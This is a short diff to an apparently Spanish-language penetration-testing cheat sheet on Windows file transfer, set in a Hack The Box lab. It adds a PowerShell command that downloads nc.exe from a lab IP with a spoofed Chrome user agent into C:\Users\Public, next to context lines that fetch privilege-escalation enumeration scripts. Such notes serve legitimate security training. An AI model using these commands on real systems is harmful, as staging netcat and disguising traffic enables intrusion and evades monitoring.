@@ -65,6 +65,11 @@ Invoke-WebRequest https://raw.githubusercontent.com/M4ximuss/Powerless/master/Po
 
 Invoke-WebRequest https://raw.githubusercontent.com/azmatt/windowsEnum/master/windowsEnum.bat -OutFile windowsEnum.bat
 ```
+Cambiar el user agent 
+```powershell
+PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
+```
+
 C#
 ```
 csharp -e 'new System.Net.WebClient ().DownloadString ("https://www.google.com")'
